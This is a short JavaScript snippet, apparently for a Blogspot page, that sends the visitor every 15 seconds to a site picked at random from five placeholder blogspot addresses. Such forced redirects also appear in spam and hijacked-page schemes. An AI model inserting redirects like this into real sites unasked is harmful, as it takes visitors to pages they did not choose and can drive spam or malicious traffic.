(function(){
setInterval(function(){
var redSites = [

  "https://situs_baru1.blogspot.com",
  "https://situs_baru2.blogspot.com",
  "https://situs_baru3.blogspot.com",
  "https://situs_baru4.blogspot.com",
  "https://situs_baru5.blogspot.com"
  
];
var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
window.location = randomLinks
},15000)
}())
